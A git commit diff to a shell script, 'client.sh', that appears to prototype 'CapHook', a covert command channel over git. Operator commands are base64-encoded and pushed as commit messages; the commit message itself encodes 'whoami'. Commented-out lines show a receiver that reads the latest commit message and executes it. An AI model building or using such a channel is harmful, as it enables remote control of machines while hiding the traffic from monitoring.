b358ac1a306aa5c76c291b597e0f714bad4dbb42
Emmanuel <aadewale123@gmail.com>
2019-09-17 20:49:33 -0400

    d2hvYW1pCg==

--- client.sh
+++ client.sh
@@ -3,12 +3,12 @@
 while true; do
     echo "CapHook>"
     read command
-    encode=$(echo ${command} | base64 -D)
-    echo $encode
-#    echo $(${command} | base64)
-#    x=$command | base64
-#    echo $x
-#    touch $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-15} | head -n 1)
+    encode=$(echo ${command} | base64)
+    echo ${encode}
+    touch $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-15} | head -n 1)
+    git add .
+    git commit -m ${encode}
+    git push
 #    commit=$(git log --pretty=oneline --abbrev-commit | awk '{print $1}' | head -n 1)
 #    commit_msg=$(git log --format=%B -n 1 $commit)
 #    exec $commit_msg
